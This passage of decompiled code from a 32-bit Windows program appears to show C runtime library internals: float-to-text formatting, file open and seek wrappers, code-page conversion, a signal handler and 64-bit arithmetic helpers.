  iVar5 = FUN_00409190((short *)&local_6,(ushort *)param_1);
  sVar3 = (short)iVar5;
  if (sVar3 == 2) {
    *(undefined4 *)((int)param_1 + 0x1c) = 3;
    if (((param_2 == 'a') || (param_2 == 'e')) || ((param_2 == 'f' || (param_2 == 'g')))) {
      puVar6 = (undefined8 *)&DAT_0040c02e;
    }
    else {
      puVar6 = (undefined8 *)&DAT_0040c02a;
    }
    uVar17 = FUN_00404a40(extraout_ECX,extraout_EDX,*(undefined8 **)(param_1 + 2),puVar6,3);
    uVar10 = (undefined4)uVar17;
  }
  else if (sVar3 < 1) {
    if ((param_2 == 'a') || (pdVar14 = extraout_ECX, pdVar15 = extraout_EDX, param_2 == 'A')) {
      puVar1 = *(undefined **)(param_1 + 2);
      *(undefined **)(param_1 + 2) = puVar1 + 1;
      *puVar1 = 0x30;
      pcVar13 = *(char **)(param_1 + 2);
      pcVar7 = pcVar13 + 1;
      *(char **)(param_1 + 2) = pcVar7;
      pdVar14 = (double *)CONCAT31((int3)((uint)pcVar7 >> 8),param_2 != 'a');
      *pcVar13 = ((param_2 != 'a') - 1U & 0x20) + 0x58;
      *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 2;
      pdVar15 = param_1;
    }
    if (sVar3 == 0) {
      local_6 = 0;
      local_56 = 0;
      puVar6 = (undefined8 *)local_3c;
    }
    else if ((param_2 == 'a') || (param_2 == 'A')) {
      pcVar7 = "0123456789abcdef";
      if (param_2 != 'a') {
        pcVar7 = "0123456789ABCDEF";
      }
      if (*(int *)((int)param_1 + 0x2c) < 0) {
        local_56 = 0x21;
        pcVar13 = pcVar7;
      }
      else {
        pcVar13 = *(char **)((int)param_1 + 0x2c);
        local_56 = (short)pcVar13 + 1;
      }
      pdVar15 = (double *)CONCAT22((short)((uint)pcVar13 >> 0x10),local_56);
      local_54 = local_56 + 1;
      if (0.0 <= local_14) {
        local_44 = *param_1;
      }
      else {
        local_44 = -*param_1;
      }
      local_14 = local_44;
      local_6 = local_6 - 4;
      local_3c[0] = 0;
      pbVar16 = local_3c + 1;
      while ((0 < local_54 && (0.0 < local_14))) {
        FUN_004091b0(&local_14,0x1c);
        lVar18 = FUN_004091d0();
        pdVar15 = (double *)lVar18;
        local_54 = local_54 + -7;
        if (0 < local_54) {
          local_14 = local_14 - (double)(int)pdVar15;
        }
        pbVar16 = pbVar16 + 7;
        pdVar14 = (double *)0x7;
        while ((0 < (int)pdVar15 && (pdVar14 = (double *)((int)pdVar14 + -1), -1 < (int)pdVar14))) {
          pbVar16 = pbVar16 + -1;
          *pbVar16 = (byte)pdVar15 & 0xf;
          pdVar15 = (double *)((int)pdVar15 >> 4);
        }
        while (pdVar14 = (double *)((int)pdVar14 + -1), -1 < (int)pdVar14) {
          pbVar16 = pbVar16 + -1;
          *pbVar16 = 0;
        }
        pbVar16 = pbVar16 + 7;
      }
      iVar5 = (int)pbVar16 - (int)(local_3c + 1);
      if (iVar5 < local_56) {
        local_54._0_2_ = (short)iVar5;
        local_56 = (short)local_54;
      }
      puVar6 = (undefined8 *)(local_3c + 1);
      if (-1 < local_56) {
        if ((local_56 < iVar5) && (7 < (byte)local_3c[local_56 + 1])) {
          cVar11 = '\x0f';
        }
        else {
          cVar11 = '\0';
        }
        pdVar14 = (double *)(int)local_56;
        while (pdVar14 = (double *)((int)pdVar14 + -1), (local_3c + 1)[(int)pdVar14] == cVar11) {
          local_56 = local_56 + -1;
        }
        if (cVar11 == '\x0f') {
          (local_3c + 1)[(int)pdVar14] = (local_3c + 1)[(int)pdVar14] + '\x01';
        }
        puVar6 = (undefined8 *)(local_3c + 1);
        if ((int)pdVar14 < 0) {
          puVar6 = (undefined8 *)local_3c;
          local_56 = local_56 + 1;
          local_6 = local_6 + 4;
        }
        pdVar15 = (double *)(int)local_56;
        while (pdVar15 = (double *)((int)pdVar15 + -1), -1 < (int)pdVar15) {
          pdVar14 = (double *)((int)pdVar15 + (int)puVar6);
          *(char *)pdVar14 = pcVar7[*(byte *)pdVar14];
        }
      }
      if (*(int *)((int)param_1 + 0x2c) < 0) {
        *(double **)((int)param_1 + 0x2c) = (double *)(local_56 + -1);
        pdVar15 = (double *)(local_56 + -1);
      }
    }
    else {
      if (local_14 < 0.0) {
        local_14 = -local_14;
      }
      local_6 = (short)(((short)local_6 * 0x7597) / 100000) - 4;
      if ((short)local_6 < 0) {
        uVar8 = 3U - (int)(short)local_6 & 0xfffffffc;
        local_6 = -(short)uVar8;
        iVar5 = 0;
        for (; 0 < (int)uVar8; uVar8 = (int)uVar8 >> 1) {
          if ((uVar8 & 1) != 0) {
            local_14 = (double)(&DAT_0040bfb0)[iVar5] * local_14;
          }
          iVar5 = iVar5 + 1;
        }
      }
      else if (0 < (short)local_6) {
        iVar5 = 0;
        local_4c = 1.0;
        local_6 = local_6 & 0xfffc;
        for (uVar4 = local_6; 0 < (short)uVar4; uVar4 = (short)uVar4 >> 1) {
          if ((uVar4 & 1) != 0) {
            local_4c = (double)(&DAT_0040bfb0)[iVar5] * local_4c;
          }
          iVar5 = iVar5 + 1;
        }
        local_14 = local_14 / local_4c;
      }
      if ((param_2 == 'f') || (param_2 == 'F')) {
        iVar5 = (short)local_6 + 10;
      }
      else {
        iVar5 = 6;
      }
      iVar5 = *(int *)((int)param_1 + 0x2c) + iVar5;
      if (0x13 < iVar5) {
        iVar5 = 0x13;
      }
      local_3c[0] = 0x30;
      pcVar7 = local_3c + 1;
      while ((0 < iVar5 && (0.0 < local_14))) {
        lVar18 = FUN_004091d0();
        local_5c = (int)lVar18;
        iVar5 = iVar5 + -8;
        if (0 < iVar5) {
          local_14 = (local_14 - (double)local_5c) * 100000000.0;
        }
        pcVar7 = pcVar7 + 8;
        local_60 = 8;
        pdVar14 = extraout_ECX_00;
        while ((0 < local_5c && (local_60 = local_60 + -1, -1 < local_60))) {
          uVar17 = FUN_00409200(local_5c,10);
          pcVar7 = pcVar7 + -1;
          *pcVar7 = (char)((ulonglong)uVar17 >> 0x20) + '0';
          local_4c._0_4_ = (int)uVar17;
          local_5c = local_4c._0_4_;
          pdVar14 = extraout_ECX_01;
        }
        while (local_60 = local_60 + -1, -1 < local_60) {
          pcVar7 = pcVar7 + -1;
          *pcVar7 = '0';
        }
        pcVar7 = pcVar7 + 8;
      }
      iVar5 = (int)pcVar7 - (int)(local_3c + 1);
      local_6 = local_6 + 7;
      puVar2 = (undefined8 *)local_3c;
      while (puVar6 = (undefined8 *)((int)puVar2 + 1), *(char *)puVar6 == '0') {
        iVar5 = iVar5 + -1;
        local_6 = local_6 - 1;
        puVar2 = puVar6;
      }
      if ((param_2 == 'f') || (param_2 == 'F')) {
        iVar9 = (short)local_6 + 1;
      }
      else if ((param_2 == 'e') || (param_2 == 'E')) {
        iVar9 = 1;
      }
      else {
        iVar9 = 0;
      }
      pdVar15 = (double *)(*(int *)((int)param_1 + 0x2c) + iVar9);
      local_56 = (short)pdVar15;
      if (iVar5 < local_56) {
        local_56 = (short)iVar5;
      }
      if (-1 < local_56) {
        if (((local_56 < iVar5) && (0x34 < *(byte *)((int)local_56 + (int)puVar6))) &&
           (*(byte *)((int)local_56 + (int)puVar6) < 0x3a)) {
          bVar12 = 0x39;
        }
        else {
          bVar12 = 0x30;
        }
        pdVar14 = (double *)(int)local_56;
        while (pdVar14 = (double *)((int)pdVar14 + -1),
              *(byte *)((int)pdVar14 + (int)puVar6) == bVar12) {
          local_56 = local_56 + -1;
        }
        if (bVar12 == 0x39) {
          *(byte *)((int)pdVar14 + (int)puVar6) = *(byte *)((int)pdVar14 + (int)puVar6) + 1;
        }
        pdVar15 = pdVar14;
        if ((int)pdVar14 < 0) {
          local_56 = local_56 + 1;
          local_6 = local_6 + 1;
          puVar6 = puVar2;
        }
      }
    }
    uVar10 = FUN_00409240((int)pdVar14,(int)pdVar15,(int)param_1,param_2,puVar6,local_56,local_6);
  }
  else {
    *(undefined4 *)((int)param_1 + 0x1c) = 3;
    if (((param_2 == 'a') || (param_2 == 'e')) || ((param_2 == 'f' || (param_2 == 'g')))) {
      puVar6 = (undefined8 *)&DAT_0040c026;
    }
    else {
      puVar6 = (undefined8 *)&DAT_0040c022;
    }
    uVar17 = FUN_00404a40(extraout_ECX,extraout_EDX,*(undefined8 **)(param_1 + 2),puVar6,3);
    uVar10 = (undefined4)uVar17;
  }
  return uVar10;
}



void FUN_004086e0(void)

{
  return;
}



int __cdecl FUN_00408710(int param_1)

{
  char *pcVar1;
  
  pcVar1 = FUN_00409600(param_1);
  (*(code *)PTR_FUN_0040d9a8)(pcVar1,0,param_1);
  return param_1;
}



void __cdecl FUN_00408730(LPCSTR param_1,uint param_2,uint param_3)

{
  FUN_00408760(param_1,param_2,0x40,param_3);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __cdecl FUN_00408760(LPCSTR param_1,uint param_2,int param_3,uint param_4)

{
  byte *pbVar1;
  uint uVar2;
  HANDLE hFile;
  DWORD DVar3;
  int iVar4;
  bool bVar5;
  byte local_31;
  uint local_24;
  DWORD local_20;
  DWORD local_1c;
  uint local_18;
  _SECURITY_ATTRIBUTES local_14;
  char local_5;
  
  local_14.nLength = 0xc;
  local_14.lpSecurityDescriptor = (LPVOID)0x0;
  bVar5 = (param_2 & 0x80) == 0;
  if (bVar5) {
    local_31 = 0;
  }
  else {
    local_31 = 0x10;
  }
  local_14.bInheritHandle = (BOOL)bVar5;
  if (((param_2 & 0x8000) == 0) && ((param_2 & 0x4000) != 0)) {
    local_31 = local_31 | 0x80;
  }
  uVar2 = param_2 & 3;
  if (uVar2 == 0) {
    local_18 = 0x80000000;
  }
  else if (uVar2 == 1) {
    local_18 = 0x40000000;
  }
  else {
    if (uVar2 != 2) {
      _DAT_0040d334 = 0x16;
      return 0xffffffff;
    }
    local_18 = 0xc0000000;
  }
  if (param_3 == 0x20) {
    local_1c = 1;
  }
  else if (param_3 < 0x21) {
    if (param_3 != 0x10) {
      _DAT_0040d334 = 0x16;
      return 0xffffffff;
    }
    local_1c = 0;
  }
  else if (param_3 == 0x30) {
    local_1c = 2;
  }
  else {
    if (param_3 < 0x30) {
      _DAT_0040d334 = 0x16;
      return 0xffffffff;
    }
    if (param_3 != 0x40) {
      _DAT_0040d334 = 0x16;
      return 0xffffffff;
    }
    local_1c = 3;
  }
  uVar2 = param_2 & 0x700;
  if (uVar2 == 0x300) {
    local_20 = 2;
    goto LAB_004088d2;
  }
  if (uVar2 < 0x301) {
    if (uVar2 == 0x100) {
      local_20 = 4;
      goto LAB_004088d2;
    }
    if (0x100 < uVar2) {
      if (uVar2 != 0x200) {
        _DAT_0040d334 = 0x16;
        return 0xffffffff;
      }
LAB_004088ae:
      local_20 = 5;
      goto LAB_004088d2;
    }
    if (uVar2 != 0) {
      _DAT_0040d334 = 0x16;
      return 0xffffffff;
    }
LAB_00408893:
    local_20 = 3;
  }
  else {
    if (uVar2 != 0x500) {
      if (uVar2 < 0x501) {
        if (uVar2 != 0x400) {
          _DAT_0040d334 = 0x16;
          return 0xffffffff;
        }
        goto LAB_00408893;
      }
      if (uVar2 == 0x600) goto LAB_004088ae;
      if (uVar2 < 0x600) {
        _DAT_0040d334 = 0x16;
        return 0xffffffff;
      }
      if (uVar2 != 0x700) {
        _DAT_0040d334 = 0x16;
        return 0xffffffff;
      }
    }
    local_20 = 1;
  }
LAB_004088d2:
  local_24 = 0x80;
  if (((param_2 & 0x100) != 0) && (local_24 = 0x80, (param_4 & 0x80) == 0)) {
    local_24 = 1;
  }
  if ((param_2 & 0x40) != 0) {
    local_24 = local_24 | 0x4000000;
    local_18 = local_18 | 0x10000;
  }
  if ((param_2 & 0x1000) != 0) {
    local_24 = local_24 | 0x100;
  }
  if ((param_2 & 0x20) == 0) {
    if ((param_2 & 0x10) != 0) {
      local_24 = local_24 | 0x10000000;
    }
  }
  else {
    local_24 = local_24 | 0x8000000;
  }
  uVar2 = FUN_00407790();
  if (uVar2 == 0xffffffff) {
    _DAT_0040d334 = 0x18;
    uVar2 = 0xffffffff;
  }
  else {
    hFile = CreateFileA(param_1,local_18,local_1c,&local_14,local_20,local_24,(HANDLE)0x0);
    if (hFile == (HANDLE)0xffffffff) {
      DVar3 = GetLastError();
      FUN_00407aa0(DVar3);
      uVar2 = 0xffffffff;
    }
    else {
      DVar3 = GetFileType(hFile);
      if (DVar3 == 0) {
        DVar3 = GetLastError();
        FUN_00407aa0(DVar3);
        CloseHandle(hFile);
        uVar2 = 0xffffffff;
      }
      else {
        if (DVar3 == 2) {
          local_31 = local_31 | 0x40;
        }
        else if (DVar3 == 3) {
          local_31 = local_31 | 8;
        }
        FUN_004078f0(uVar2,hFile);
        *(byte *)((&DAT_0040e304)[(int)uVar2 >> 5] + 4 + (uVar2 & 0x1f) * 8) = local_31 | 1;
        if ((((local_31 & 0x48) == 0) && ((local_31 & 0x80) != 0)) && ((param_2 & 2) != 0)) {
          DVar3 = FUN_00408af0(uVar2,-1,2);
          if (DVar3 == 0xffffffff) {
            DVar3 = GetLastError();
            if (DVar3 != 0x83) {
              FUN_00405690(uVar2);
              return 0xffffffff;
            }
          }
          else {
            local_5 = '\0';
            iVar4 = FUN_004071b0(uVar2,&local_5,1);
            if (((iVar4 == 0) && (local_5 == '\x1a')) &&
               (iVar4 = FUN_00409840(uVar2,DVar3), iVar4 == -1)) {
              FUN_00405690(uVar2);
              return 0xffffffff;
            }
            DVar3 = FUN_00408af0(uVar2,0,0);
            if (DVar3 == 0xffffffff) {
              FUN_00405690(uVar2);
              return 0xffffffff;
            }
          }
        }
        if (((local_31 & 0x48) == 0) && ((param_2 & 8) != 0)) {
          pbVar1 = (byte *)((&DAT_0040e304)[(int)uVar2 >> 5] + 4 + (uVar2 & 0x1f) * 8);
          *pbVar1 = *pbVar1 | 0x20;
        }
      }
    }
  }
  return uVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

DWORD __cdecl FUN_00408af0(uint param_1,LONG param_2,DWORD param_3)

{
  byte *pbVar1;
  DWORD DVar2;
  HANDLE hFile;
  
  if ((param_1 < DAT_0040e300) &&
     ((*(byte *)((&DAT_0040e304)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    hFile = (HANDLE)FUN_00407980(param_1);
    if (hFile == (HANDLE)0xffffffff) {
      _DAT_0040d334 = 9;
      DVar2 = 0xffffffff;
    }
    else {
      DVar2 = SetFilePointer(hFile,param_2,(PLONG)0x0,param_3);
      if (DVar2 == 0xffffffff) {
        DVar2 = GetLastError();
        FUN_00407aa0(DVar2);
        DVar2 = 0xffffffff;
      }
      else {
        pbVar1 = (byte *)((&DAT_0040e304)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8);
        *pbVar1 = *pbVar1 & 0xfd;
      }
    }
  }
  else {
    _DAT_0040d334 = 9;
    DVar2 = 0xffffffff;
  }
  return DVar2;
}



void __cdecl FUN_00408b90(UINT param_1,UINT param_2,LPCSTR param_3,int param_4)

{
  int cchWideChar;
  int iVar1;
  undefined unaff_DI;
  
  if (((param_1 != 0) && (param_2 != 0)) && (param_1 != param_2)) {
    cchWideChar = MultiByteToWideChar(param_2,0,param_3,param_4,(LPWSTR)0x0,0);
    if (cchWideChar != 0) {
      FUN_004099b0(unaff_DI);
      iVar1 = MultiByteToWideChar(param_2,0,param_3,param_4,(LPWSTR)&stack0xffffffe8,cchWideChar);
      if (iVar1 != 0) {
        iVar1 = WideCharToMultiByte(param_1,0,(LPCWSTR)&stack0xffffffe8,cchWideChar,(LPSTR)0x0,0,
                                    (LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar1 == param_4) {
          WideCharToMultiByte(param_1,0,(LPCWSTR)&stack0xffffffe8,cchWideChar,param_3,param_4,
                              (LPCSTR)0x0,(LPBOOL)0x0);
        }
      }
    }
  }
  return;
}



undefined4 __cdecl FUN_00408c40(int param_1)

{
  code *pcVar1;
  char *pcVar2;
  undefined local_6 [2];
  
  pcVar1 = (code *)FUN_00407d30(param_1,1);
  if (pcVar1 == (code *)0xffffffff) {
    return 0xffffffff;
  }
  if (pcVar1 == (code *)0x1) {
    return 0;
  }
  if (pcVar1 != (code *)0x0) {
    FUN_00407d30(param_1,0);
    (*pcVar1)(param_1);
    return 0;
  }
  switch(param_1) {
  case 2:
    pcVar2 = "interruption";
    break;
  case 4:
    pcVar2 = "invalid executable code";
    break;
  case 6:
    pcVar2 = "abort";
    break;
  case 8:
    pcVar2 = "arithmetic error";
    break;
  case 0xb:
    pcVar2 = "invalid storage access";
    break;
  default:
    if (param_1 == 0xf) {
      pcVar2 = "termination request";
      break;
    }
  case 3:
  case 5:
  case 7:
  case 9:
  case 10:
    local_6[1] = 0;
    pcVar2 = local_6 + 1;
    do {
      pcVar2 = (char *)((int)pcVar2 + -1);
      *pcVar2 = (char)(param_1 % 10) + '0';
      param_1 = param_1 / 10;
    } while (param_1 != 0);
    FUN_00409a00((undefined8 *)"signal #",(uint *)&DAT_0040d428);
  }
  FUN_00409a00((undefined8 *)pcVar2,(uint *)&DAT_0040d428);
  FUN_00409a00((undefined8 *)" -- terminating\n",(uint *)&DAT_0040d428);
  FUN_00404720(1);
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __cdecl FUN_00408d40(byte *param_1,ushort param_2,undefined4 *param_3)

{
  ushort uVar1;
  ushort uVar2;
  bool bVar3;
  uint uVar4;
  byte *pbVar5;
  int iVar6;
  uint uVar7;
  byte local_25;
  byte *local_24;
  int local_14;
  
  if (PTR_DAT_0040d920 == (undefined *)0x0) {
    if (param_1 == (byte *)0x0) {
      *param_3 = 0;
      param_3[1] = 0;
      uVar4 = 0;
    }
    else {
      if ((param_2 & 0xff80) == 0) {
        *param_1 = (byte)param_2;
        iVar6 = 0;
      }
      else if ((param_2 & 0xf800) == 0) {
        *param_1 = (byte)((int)(uint)param_2 >> 6) | 0xc0;
        iVar6 = 1;
      }
      else {
        *param_1 = (byte)((int)(uint)param_2 >> 0xc) | 0xe0;
        iVar6 = 2;
      }
      local_24 = param_1 + 1;
      if (iVar6 != 0) {
        do {
          pbVar5 = local_24 + 1;
          iVar6 = iVar6 + -1;
          *local_24 = (byte)((int)(uint)param_2 >> ((char)iVar6 * '\x06' & 0x1fU)) & 0x3f | 0x80;
          local_24 = pbVar5;
        } while (0 < iVar6);
      }
      uVar4 = (int)local_24 - (int)param_1;
    }
  }
  else if (PTR_DAT_0040d920 == (undefined *)0x1) {
    if (param_1 == (byte *)0x0) {
      *param_3 = 0;
      param_3[1] = 0;
      uVar4 = 0;
    }
    else {
      uVar4 = FUN_00409af0((LPSTR)param_1);
    }
  }
  else {
    local_25 = *(byte *)((int)param_3 + 6);
    bVar3 = false;
    local_14 = 0;
    uVar7 = 0;
    if (param_1 == (byte *)0x0) {
      *param_3 = 0;
      param_3[1] = 0;
      uVar4 = *(ushort *)PTR_DAT_0040d920 & 0xf00;
    }
    else {
      do {
        if ((((0xf < local_25) || ((&PTR_DAT_0040d960)[local_25] == (undefined *)0x0)) ||
            ((int)(uint)DAT_0040d89c <= (int)uVar7)) ||
           ((local_14 = local_14 + 1, 0xfef < local_14 ||
            (uVar1 = *(ushort *)((&PTR_DAT_0040d960)[local_25] + (param_2 & 0xff) * 2), uVar1 == 0))
           )) {
          _DAT_0040d334 = 0x2a;
          return 0xffffffff;
        }
        local_25 = (byte)(uVar1 >> 8) & 0xf;
        if ((uVar1 & 0x8000) != 0) {
          param_2 = param_2 & 0xff00 | uVar1 & 0xff;
        }
        if ((uVar1 & 0x1000) != 0) {
          param_2 = param_2 >> 8 | param_2 << 8;
        }
        uVar4 = uVar7;
        if ((uVar1 & 0x2000) != 0) {
          uVar4 = uVar7 + 1;
          uVar2 = param_2;
          if ((uVar1 & 0xff) != 0) {
            uVar2 = uVar1;
          }
          param_1[uVar7] = (byte)uVar2;
          if ((byte)uVar2 == 0) {
            bVar3 = true;
          }
          local_14 = 0;
        }
      } while (((uVar1 & 0x4000) == 0) && (uVar7 = uVar4, !bVar3));
      *(ushort *)((int)param_3 + 6) = (ushort)local_25;
    }
  }
  return uVar4;
}



undefined8 FUN_00408fb0(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  bool bVar11;
  
  uVar3 = param_3;
  uVar4 = param_2;
  uVar9 = param_4;
  uVar10 = param_1;
  if (param_2 == 0) {
    iVar6 = (int)(((ulonglong)param_4 % (ulonglong)param_1 << 0x20 | (ulonglong)param_3) %
                 (ulonglong)param_1);
    iVar7 = 0;
  }
  else {
    do {
      uVar5 = uVar4 >> 1;
      uVar10 = uVar10 >> 1 | (uint)((uVar4 & 1) != 0) << 0x1f;
      uVar8 = uVar9 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar4 = uVar5;
      uVar9 = uVar8;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar8,uVar3) / (ulonglong)uVar10;
    uVar3 = (int)uVar1 * param_2;
    lVar2 = (uVar1 & 0xffffffff) * (ulonglong)param_1;
    uVar9 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar4 = (uint)lVar2;
    uVar10 = uVar9 + uVar3;
    if (((CARRY4(uVar9,uVar3)) || (param_4 < uVar10)) || ((param_4 <= uVar10 && (param_3 < uVar4))))
    {
      bVar11 = uVar4 < param_1;
      uVar4 = uVar4 - param_1;
      uVar10 = (uVar10 - param_2) - (uint)bVar11;
    }
    iVar6 = -(uVar4 - param_3);
    iVar7 = -(uint)(uVar4 - param_3 != 0) - ((uVar10 - param_4) - (uint)(uVar4 < param_3));
  }
  return CONCAT44(iVar7,iVar6);
}



undefined8 FUN_00409030(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_4 < 0;
  if ((bool)cVar11) {
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  if ((int)param_2 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  uVar3 = param_3;
  uVar5 = param_1;
  uVar6 = param_4;
  uVar9 = param_2;
  if (param_2 == 0) {
    uVar3 = param_4 / param_1;
    iVar4 = (int)(((ulonglong)param_4 % (ulonglong)param_1 << 0x20 | (ulonglong)param_3) /
                 (ulonglong)param_1);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_1 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_2;
    if (((CARRY4(uVar3,iVar4 * param_2)) || (param_4 < uVar5)) ||
       ((param_4 <= uVar5 && (param_3 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



longlong FUN_004090e0(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_2 | param_4) == 0) {
    return (ulonglong)param_3 * (ulonglong)param_1;
  }
  return CONCAT44((int)((ulonglong)param_3 * (ulonglong)param_1 >> 0x20) +
                  param_4 * param_1 + param_3 * param_2,
                  (int)((ulonglong)param_3 * (ulonglong)param_1));
}



undefined4 __cdecl FUN_00409120(short *param_1)

{
  if ((param_1[3] & 0x7ff0U) == 0x7ff0) {
    if ((((param_1[3] & 0xfU) == 0) && (param_1[2] == 0)) && ((param_1[1] == 0 && (*param_1 == 0))))
    {
      return 1;
    }
    return 2;
  }
  if (((((param_1[3] & 0x7fffU) == 0) && (param_1[2] == 0)) && (param_1[1] == 0)) && (*param_1 == 0)
     ) {
    return 0;
  }
  return 0xffffffff;
}



int __cdecl FUN_00409190(short *param_1,ushort *param_2)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00409b50(param_1,param_2);
  return (int)(short)uVar1;
}



int __cdecl FUN_004091b0(double *param_1,int param_2)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00409bf0(param_1,param_2);
  return (int)(short)uVar1;
}



longlong FUN_004091d0(void)

{
  float10 in_ST0;
  
  return (longlong)ROUND(in_ST0);
}



undefined8 __cdecl FUN_00409200(int param_1,int param_2)

{
  return CONCAT44(param_1 - param_2 * (param_1 / param_2),param_1 / param_2);
}



void __fastcall
FUN_00409240(int param_1,int param_2,int param_3,char param_4,undefined8 *param_5,short param_6,
            short param_7)

{
  undefined uVar1;
  int iVar2;
  int extraout_ECX;
  int iVar3;
  char *pcVar4;
  char *pcVar5;
  short sVar6;
  undefined8 uVar7;
  int local_20;
  short local_18;
  char acStack_f [11];
  
  uVar1 = *PTR_DAT_0040d9d8;
  if (param_6 < 1) {
    param_6 = 1;
    param_5 = (undefined8 *)&DAT_0040c0ec;
  }
  if (((param_4 == 'f') || (param_4 == 'F')) ||
     (((param_4 == 'g' || (param_4 == 'G')) &&
      ((-5 < param_7 && ((int)param_7 < *(int *)(param_3 + 0x2c))))))) {
    sVar6 = param_7 + 1;
    if ((param_4 != 'f') && (param_4 != 'F')) {
      if (((*(ushort *)(param_3 + 0x38) & 8) == 0) && ((int)param_6 < *(int *)(param_3 + 0x2c))) {
        *(int *)(param_3 + 0x2c) = (int)param_6;
      }
      param_2 = (int)sVar6;
      iVar2 = *(int *)(param_3 + 0x2c) - param_2;
      *(int *)(param_3 + 0x2c) = iVar2;
      if (iVar2 < 0) {
        *(undefined4 *)(param_3 + 0x2c) = 0;
      }
    }
    if (sVar6 < 1) {
      iVar2 = *(int *)(param_3 + 0x1c);
      *(int *)(param_3 + 0x1c) = iVar2 + 1;
      iVar3 = *(int *)(param_3 + 0x10);
      *(undefined *)(iVar3 + iVar2) = 0x30;
      if ((0 < *(int *)(param_3 + 0x2c)) || ((*(ushort *)(param_3 + 0x38) & 8) != 0)) {
        iVar3 = *(int *)(param_3 + 0x1c);
        *(int *)(param_3 + 0x1c) = iVar3 + 1;
        param_1 = *(int *)(param_3 + 0x10);
        *(undefined *)(param_1 + iVar3) = uVar1;
      }
      if (SBORROW4(*(int *)(param_3 + 0x2c),-(int)sVar6) !=
          *(int *)(param_3 + 0x2c) + (int)sVar6 < 0) {
        sVar6 = -(short)*(undefined4 *)(param_3 + 0x2c);
      }
      *(int *)(param_3 + 0x20) = -(int)sVar6;
      *(int *)(param_3 + 0x2c) = *(int *)(param_3 + 0x2c) + (int)sVar6;
      if (*(int *)(param_3 + 0x2c) < (int)param_6) {
        param_6 = *(short *)(param_3 + 0x2c);
      }
      *(int *)(param_3 + 0x24) = (int)param_6;
      FUN_00404a40(param_1,iVar3,(undefined8 *)(*(int *)(param_3 + 0x1c) + *(int *)(param_3 + 0x10))
                   ,param_5,(int)param_6);
      *(int *)(param_3 + 0x28) = *(int *)(param_3 + 0x2c) - (int)param_6;
    }
    else if (param_6 < sVar6) {
      FUN_00404a40(param_1,param_2,
                   (undefined8 *)(*(int *)(param_3 + 0x1c) + *(int *)(param_3 + 0x10)),param_5,
                   (int)param_6);
      *(int *)(param_3 + 0x1c) = *(int *)(param_3 + 0x1c) + (int)param_6;
      *(int *)(param_3 + 0x20) = (int)sVar6 - (int)param_6;
      if ((0 < *(int *)(param_3 + 0x2c)) || ((*(ushort *)(param_3 + 0x38) & 8) != 0)) {
        *(undefined *)(*(int *)(param_3 + 0x1c) + *(int *)(param_3 + 0x10)) = uVar1;
        *(int *)(param_3 + 0x24) = *(int *)(param_3 + 0x24) + 1;
      }
      *(undefined4 *)(param_3 + 0x28) = *(undefined4 *)(param_3 + 0x2c);
    }
    else {
      uVar7 = FUN_00404a40(param_1,param_2,
                           (undefined8 *)(*(int *)(param_3 + 0x1c) + *(int *)(param_3 + 0x10)),
                           param_5,(int)sVar6);
      iVar2 = (int)((ulonglong)uVar7 >> 0x20);
      *(int *)(param_3 + 0x1c) = *(int *)(param_3 + 0x1c) + (int)sVar6;
      param_6 = param_6 - sVar6;
      if ((0 < *(int *)(param_3 + 0x2c)) ||
         (iVar3 = extraout_ECX, (*(ushort *)(param_3 + 0x38) & 8) != 0)) {
        iVar2 = *(int *)(param_3 + 0x1c);
        *(int *)(param_3 + 0x1c) = iVar2 + 1;
        iVar3 = *(int *)(param_3 + 0x10);
        *(undefined *)(iVar3 + iVar2) = uVar1;
      }
      if (*(int *)(param_3 + 0x2c) < (int)param_6) {
        param_6 = *(short *)(param_3 + 0x2c);
      }
      FUN_00404a40(iVar3,iVar2,(undefined8 *)(*(int *)(param_3 + 0x1c) + *(int *)(param_3 + 0x10)),
                   (undefined8 *)((int)sVar6 + (int)param_5),(int)param_6);
      *(int *)(param_3 + 0x1c) = *(int *)(param_3 + 0x1c) + (int)param_6;
      *(int *)(param_3 + 0x20) = *(int *)(param_3 + 0x2c) - (int)param_6;
    }
  }
  else {
    if ((param_4 == 'g') || (param_4 == 'G')) {
